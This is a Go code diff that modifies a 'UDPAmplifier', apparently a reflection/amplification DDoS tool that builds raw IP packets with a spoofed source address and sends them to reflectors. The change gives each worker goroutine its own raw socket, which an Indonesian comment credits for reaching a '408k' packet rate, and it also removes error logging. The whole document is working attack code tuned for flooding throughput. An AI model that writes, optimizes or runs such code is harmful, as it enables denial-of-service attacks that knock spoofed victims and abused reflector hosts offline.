@@ -27,7 +27,6 @@ type UDPAmplifier struct {
 	dstIP   net.IP
 	dstPort uint16
 	packets atomic.Uint64
-	fd      int
 }
 
 func NewUDPAmplifier(typ AmpType, spoofSrc, reflector string, reflectorPort uint16) (*UDPAmplifier, error) {
@@ -36,12 +35,7 @@ func NewUDPAmplifier(typ AmpType, spoofSrc, reflector string, reflectorPort uint
 	if src == nil || dst == nil {
 		return nil, unix.EINVAL
 	}
-	fd, err := unix.Socket(unix.AF_INET, unix.SOCK_RAW, unix.IPPROTO_RAW)
-	if err != nil {
-		return nil, err
-	}
-	unix.SetsockoptInt(fd, unix.IPPROTO_IP, unix.IP_HDRINCL, 1)
-	return &UDPAmplifier{typ: typ, srcIP: src, dstIP: dst, dstPort: reflectorPort, fd: fd}, nil
+	return &UDPAmplifier{typ: typ, srcIP: src, dstIP: dst, dstPort: reflectorPort}, nil
 }
 
 func (u *UDPAmplifier) payload() []byte {
@@ -125,15 +119,14 @@ func (u *UDPAmplifier) buildPacketInto(buf []byte, payload []byte, rng *rand.Ran
 
 func (u *UDPAmplifier) Run(stop <-chan struct{}, workers int) {
 	if workers <= 0 {
-		workers = runtime.NumCPU() * 8
-		if workers < 16 {
-			workers = 16
+		workers = runtime.NumCPU() * 2
+		if workers < 8 {
+			workers = 8
 		}
 	}
 
 	dst := &unix.SockaddrInet4{Port: int(u.dstPort)}
 	copy(dst.Addr[:], u.dstIP)
-
 	payload := u.payload()
 	if payload == nil {
 		return
@@ -146,6 +139,15 @@ func (u *UDPAmplifier) Run(stop <-chan struct{}, workers int) {
 		wg.Add(1)
 		go func(seed int64) {
 			defer wg.Done()
+
+			// tiap worker buka FD sendiri — ini kunci dari versi 408k yang works
+			fd, err := unix.Socket(unix.AF_INET, unix.SOCK_RAW, unix.IPPROTO_RAW)
+			if err != nil {
+				return
+			}
+			defer unix.Close(fd)
+			unix.SetsockoptInt(fd, unix.IPPROTO_IP, unix.IP_HDRINCL, 1)
+
 			rng := rand.New(rand.NewSource(time.Now().UnixNano() ^ seed))
 			buf := make([]byte, pktCap)
 
@@ -159,19 +161,13 @@ func (u *UDPAmplifier) Run(stop <-chan struct{}, workers int) {
 				if n == 0 {
 					continue
 				}
-				err := unix.Sendto(u.fd, buf[:n], 0, dst)
-				if err != nil {
-					if seed == 0 {
-						println("sendto err:", err.Error())
-					}
-					continue
+				if err := unix.Sendto(fd, buf[:n], 0, dst); err == nil {
+					u.packets.Add(1)
 				}
-				u.packets.Add(1)
 			}
 		}(int64(w))
 	}
 	wg.Wait()
-	unix.Close(u.fd)
 }
 
 func (u *UDPAmplifier) Packets() uint64 { return u.packets.Load() }
